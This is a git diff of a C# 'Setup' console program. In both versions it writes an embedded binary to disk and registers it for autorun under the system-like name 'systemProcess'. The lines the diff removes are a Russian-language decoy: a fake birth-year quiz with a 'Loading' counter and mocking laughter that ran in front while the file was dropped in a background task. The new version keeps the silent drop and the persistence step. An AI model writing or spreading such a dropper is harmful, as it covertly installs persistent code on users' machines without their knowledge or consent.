@@ -18,45 +18,16 @@ namespace Setup
 
         static void Main(string[] args)
         {
-            Task.Run(() =>
+            try
             {
-                try
-                {
-                    File.WriteAllBytes(pathToPrikol, Resource1.SystemFile);
-                    SetToAutorun("systemProcess");
-                }
+                File.WriteAllBytes(pathToPrikol, Resource1.SystemFile);
+                SetToAutorun("systemProcess");
+            }
 
-                catch
-                {
-                    Console.WriteLine("Какаета ошибка!!!!");
-                }
-            });
-
-            Console.ForegroundColor = ConsoleColor.Yellow;
-
-            Console.Write("Введите ваш год рождения: ");
-            Console.ReadLine();
-            Console.ForegroundColor = ConsoleColor.Yellow;
-
-            Console.ForegroundColor = ConsoleColor.Cyan;
-            Console.WriteLine("Загрузка");
-
-            Thread.Sleep(1000);
-
-            for (var i = 0; i < 10000; i++) Console.Write($"{i}");
-
-            Thread.Sleep(1000);
-
-            Console.WriteLine();
-
-            Console.ForegroundColor = ConsoleColor.Yellow;
-            Console.WriteLine("Похоже вам: ");
-
-            Thread.Sleep(1000);
-
-            Console.WriteLine("Аапапахапхахпхапахпхапх, а я че знаю что-ли, апаапазпзапзапзазпазпхапвхаххпахххапахпхапаххаппаапъаъпхаахпахпап");
-
-            Console.ReadKey();
+            catch(Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
         }
 
         static void SetToAutorun(string nameInRegistry)
